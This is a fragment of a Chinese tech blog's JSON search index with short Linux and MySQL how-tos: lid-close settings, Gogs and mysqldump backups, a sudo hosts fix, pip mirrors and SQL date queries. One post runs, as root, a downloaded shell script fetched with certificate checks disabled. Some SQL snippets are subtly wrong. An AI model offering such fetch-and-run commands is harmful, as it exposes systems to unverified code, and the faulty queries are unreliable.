建议本地添加host到主域名上，就是HTTPS的域名上","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"},{"name":"Nextcloud","slug":"Nextcloud","permalink":"https://blog.110.sh/tags/Nextcloud/"}]},{"title":"在笔记本关闭显示器后保持UbuntuServer系统继续运行","slug":"keep-ubuntu-server-running-on-a-laptop-with-the-screen-closed","date":"2018-08-11T10:13:37.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/11/keep-ubuntu-server-running-on-a-laptop-with-the-screen-closed/","link":"","permalink":"https://blog.110.sh/2018/08/11/keep-ubuntu-server-running-on-a-laptop-with-the-screen-closed/","excerpt":"在笔记本关闭显示器后保持UbuntuServer系统继续运行","text":"在笔记本关闭显示器后保持UbuntuServer系统继续运行 编辑文件 /etc/systemd/logind.conf 修改这句 #HandleLidSwitch=suspend 改为 HandleLidSwitch=ignore 然后 1sudo service systemd-logind restart","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"},{"name":"Ubuntu Server","slug":"Ubuntu-Server","permalink":"https://blog.110.sh/tags/Ubuntu-Server/"}]},{"title":"备份恢复GOGS服务","slug":"backup-and-restore-gogs","date":"2018-08-11T10:02:00.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/11/backup-and-restore-gogs/","link":"","permalink":"https://blog.110.sh/2018/08/11/backup-and-restore-gogs/","excerpt":"如何备份和恢复Gogs，原本数据放在 树莓派上，不保险就移植到 x86 笔记本上。","text":"如何备份和恢复Gogs，原本数据放在 树莓派上，不保险就移植到 x86 笔记本上。 备份 12./gogs backup# 这会产生一个文件，名称类似于gogs-backup-20180811192113.zip 恢复 12# 如果是使用的数据库，记得创建数据库，否则可能报错./gogs restore --from=\"gogs-backup-20180811192113.zip\" 和之前安装位置目录不同 到管理员控制面板（/admin）执行以下操作： 重新生成 ‘.ssh/authorized_keys’ 文件 重新同步所有仓库的 pre-receive、update 和 post-receive 钩子","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"},{"name":"Gogs","slug":"Gogs","permalink":"https://blog.110.sh/tags/Gogs/"}]},{"title":"解决sudo命令执行缓慢的问题","slug":"solve-sudo-command-too-slow","date":"2018-08-11T09:57:31.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2018/08/11/solve-sudo-command-too-slow/","link":"","permalink":"https://blog.110.sh/2018/08/11/solve-sudo-command-too-slow/","excerpt":"在Ubuntu系统下，解决sudo执行缓慢需要等待的问题。","text":"在Ubuntu系统下，解决sudo执行缓慢需要等待的问题。 解决办法一般是由于/etc/hosts文件中没有对应的 ”主机名 IP地址” 相互解析条目 解决方法如下： 首先运行hostname指令，显示当前主机名 12[root@Mylinux ~]# hostname你的Hostname 然后在/etc/hosts文件中加入一条主机名与IP地址之间的相互解析条目 1[root@Mylinux ~]# echo '127.0.0.1 你的Hostname' &gt;&gt; /etc/hosts","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.110.sh/tags/Ubuntu/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"}]},{"title":"MySQL 备份与恢复","slug":"mysql-backup-and-restore","date":"2018-08-11T09:37:35.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/11/mysql-backup-and-restore/","link":"","permalink":"https://blog.110.sh/2018/08/11/mysql-backup-and-restore/","excerpt":"Mysql备份与恢复","text":"Mysql备份与恢复 MySQL 备份与恢复备份部分12345678910111213141516171819# 导出全部数据库及表[root@localhost /] mysqldump --all-databases &gt; /tmp/dump.sql# 导出部分数据库及表[root@localhost /] mysqldump --databases db1 db2 db3 &gt; /tmp/dump.sql# 导出单个数据库可以用如下两种格式# 区别是使用--databases在导出数据时会加上CREATE DATABASE 或 USE 语句，不使用--databases参数在导入数据时需要先指定一个存在的数据库作为默认数据库导入数据。[root@localhost /] mysqldump --databases test &gt; /tmp/dump.sql[root@localhost /] mysqldump test &gt; /tmp/dump.sql# 导出指定表[root@localhost /] mysqldump test t1 t3 t5 &gt; /tmp/dump.sql[root@localhost /] mysqldump --tables test t1 t3 t5 &gt; /tmp/dump.sql# 导出到文件SELECT order_id,product_name,qtyFROM ordersWHERE foo = 'bar'INTO OUTFILE '/var/lib/mysql-files/orders.csv'FIELDS TERMINATED BY ','ENCLOSED BY '\"'LINES TERMINATED BY '\\n'; 恢复部分 如果导出文件时指定了–all-databases 或 –databases选项，备份文件会包含CREATE DATABASE 和 USE语句，我们直接导入即可，无需预先创建库和指定库。以下两种方式均可。 1[root@localhost /] mysql &lt; /tmp/dump.sql #(方法1：shell命令行操作) 1mysql&gt; source /tmp/dump.sql ---（方法2：进入mysql数据库操作） 如果导出文件时未指定了–all-databases 或 –databases选项，备份文件不包含CREATE DATABASE 和 USE语句，导入数据前我们需要预先创建库和指定库。 方法1：shell命令行下操作 12[root@localhost /]# mysqladmin create db1[root@localhost /]# mysql db1 &lt; /tmp/dump.sql 方法2：进入mysql数据库操作 123mysql&gt; CREATE DATABASE IF NOT EXISTS db1;mysql&gt; USE db1;mysql&gt; source dump.sql","categories":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.110.sh/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.110.sh/tags/MySQL/"}]},{"title":"一键开启BBR脚本","slug":"one-key-enable-bbr","date":"2018-08-09T10:04:28.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/08/09/one-key-enable-bbr/","link":"","permalink":"https://blog.110.sh/2018/08/09/one-key-enable-bbr/","excerpt":"一键开启BBR脚本","text":"一键开启BBR脚本 切换到root 输入命令 12wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh &amp;&amp; chmod +x bbr.sh &amp;&amp; ./bbr.sh# 按任意键开始安装，然后需要重启系统，重启完毕即可开启BBR","categories":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.110.sh/tags/Linux/"}]},{"title":"SQL根据时间范围查询","slug":"sql-query-by-time-range","date":"2018-08-03T08:22:58.000Z","updated":"2020-12-27T16:04:52.946Z","comments":true,"path":"2018/08/03/sql-query-by-time-range/","link":"","permalink":"https://blog.110.sh/2018/08/03/sql-query-by-time-range/","excerpt":"根据时间查询，今天、昨天、近七天、近三十天、本月、上个月….","text":"根据时间查询，今天、昨天、近七天、近三十天、本月、上个月…. 下面代码中 my_table 是表名，time_column 是时间列 自行替换 12345678910111213141516171819202122232425262728293031323334-- 今天 select * from my_table where to_days(time_column) &lt;= to_days(now());-- 昨天 select * from my_table where to_days(NOW()) - TO_DAYS(time_column) &lt;= 1; -- 近7天 select * from my_table where date_sub(CURDATE(),INTERVAL 7 DAY) &lt;= DATE(time_column); -- 近30天 SELECT * FROM my_table where DATE_SUB(CURDATE(), INTERVAL 30 DAY) &lt;= date(time_column);-- 本月 SELECT * FROM my_table WHERE DATE_FORMAT( time_column, '%Y%m' ) = DATE_FORMAT( CURDATE() , '%Y%m' );-- 上一月 SELECT * FROM my_table WHERE PERIOD_DIFF( date_format( now( ) , '%Y%m' ) , date_format( time_column, '%Y%m' ) ) =1;-- 查询本季度数据 select * FROM my_table where QUARTER(time_column)=QUARTER(now());-- 查询上季度数据 select * FROM my_table where QUARTER(time_column)=QUARTER(DATE_SUB(now(),interval 1 QUARTER)); -- 查询本年数据 select * FROM my_table where YEAR(time_column)=YEAR(NOW()); -- 查询上年数据 select * FROM my_table where year(time_column)=year(date_sub(now(),interval 1 year)); -- 查询距离当前现在6个月的数据 select * FROM my_table where time_column between date_sub(now(),interval 6 month) and now(); -- 查询当前这周的数据 SELECT * FROM my_table WHERE YEARWEEK(date_format(time_column,'%Y-%m-%d')) = YEARWEEK(now()); -- 查询上周的数据 SELECT * FROM my_table WHERE YEARWEEK(date_format(time_column,'%Y-%m-%d')) = YEARWEEK(now())-1; -- 查询上个月的数据select * FROM my_table where date_format(time_column,'%Y-%m')=date_format(DATE_SUB(curdate(), INTERVAL 1 MONTH),'%Y-%m');-- 查询当前月份的数据select * FROM my_table where DATE_FORMAT(time_column,'%Y%m') = DATE_FORMAT(CURDATE(),'%Y%m');select * FROM my_table where date_format(time_column,'%Y-%m')=date_format(now(),'%Y-%m');-- 查询指定时间段的数据select * FROM my_table where time_column between '2017-1-1 00:00:00' and '2018-1-1 00:00:00';select * FROM my_table where time_column &gt;='2017-1-1 00:00:00' and addedTime &lt; '2018-1-1 00:00:00';","categories":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.110.sh/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.110.sh/tags/MySQL/"},{"name":"SQL","slug":"SQL","permalink":"https://blog.110.sh/tags/SQL/"},{"name":"Web","slug":"Web","permalink":"https://blog.110.sh/tags/Web/"}]},{"title":"懒人快速修改pip源","slug":"change-pip-source","date":"2018-07-19T01:29:06.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/07/19/change-pip-source/","link":"","permalink":"https://blog.110.sh/2018/07/19/change-pip-source/","excerpt":"Linux 下快懒人快速修改pip源","text":"Linux 下快懒人快速修改pip源123456mkdir -p ~/.config/pip/cat &gt; ~/.config/pip/pip.conf &lt;&lt; EOF[global]index-url = https://mirrors.ustc.edu.cn/pypi/web/simpleformat = columnsEOF 结束","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.110.sh/categories/Python/"}],"tags":[{"name":"pip","slug":"pip","permalink":"https://blog.110.sh/tags/pip/"},{"name":"Python","slug":"Python","permalink":"https://blog.110.sh/tags/Python/"}]},{"title":"Hello","slug":"hello","date":"2018-07-17T09:26:35.000Z","updated":"2020-12-27T16:04:52.942Z","comments":true,"path":"2018/07/17/hello/","link":"","permalink":"https://blog.110.sh/2018/07/17/hello/","excerpt":"","text":"尝试 hugo 测试发布","categories":[],"tags":[]}]}